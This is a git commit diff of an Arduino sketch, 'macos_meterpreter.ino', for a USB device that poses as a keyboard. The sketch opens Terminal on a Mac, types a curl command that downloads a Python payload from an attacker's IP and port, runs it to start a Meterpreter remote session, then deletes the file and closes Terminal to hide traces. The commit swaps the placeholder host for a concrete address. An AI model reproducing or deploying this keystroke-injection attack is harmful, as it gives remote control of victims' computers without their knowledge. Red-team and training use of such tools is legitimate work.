4ece4374f3391a65eab6396a64b78ba62f13d9fd
Semyon <65248646+cucurucuq@users.noreply.github.com>
2023-02-13 08:05:27 +0300

    Update macos_meterpreter.ino

--- macos_meterpreter.ino
+++ macos_meterpreter.ino
@@ -1,8 +1,8 @@
 #include <phukdlib_leonardo.h>
 
 
-#define upload "curl http://192.168.0.1:1337/path/to/file.py -o test.py" // update attacker's IP, port, path to file and output file
-#define shell "python test.py" // update .py filename (output file)
+#define upload "curl http://192.168.11.125:8081/test_mac/MacOS.py -o MacOS.py" // update attacker's IP, port, path to file and output file
+#define shell "python MacOS.py" // update .py filename (output file)
 
 void setup() {
   Keyboard.begin();
@@ -10,29 +10,24 @@ void setup() {
 
 void loop() {
   delay(5000);
-  CommandAtRunBarOSX("terminal");
-  Keyboard.press(KEY_RETURN);
-  delay(2000);
-  Keyboard.press(KEY_RETURN);
+  CommandAtRunBarOSX("terminal"); 
+  Keyboard.write(KEY_RETURN);
   delay(2000);
   Keyboard.println(upload);
   delay(1000);
-  Keyboard.press(KEY_RETURN);
-  Keyboard.release(KEY_RETURN);
+  Keyboard.write(KEY_RETURN);
   delay(800);
   Keyboard.println(shell);             // open payload file -> handling session
   delay(1000);
-  Keyboard.press(KEY_RETURN);
-  Keyboard.release(KEY_RETURN);
-  delay(3500);
+  Keyboard.write(KEY_RETURN);
+  delay(2500);
   Keyboard.press(KEY_LEFT_CTRL);
   Keyboard.press('z'); 
   Keyboard.releaseAll();               // CTRL + Z for interrupt .py 
   delay(1000);
   Keyboard.println("rm MacOS.py");     // remove payload file
   delay(1000);
-  Keyboard.press(KEY_RETURN);
-  Keyboard.release(KEY_RETURN);        
+  Keyboard.write(KEY_RETURN);       
   delay(800);
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('q');
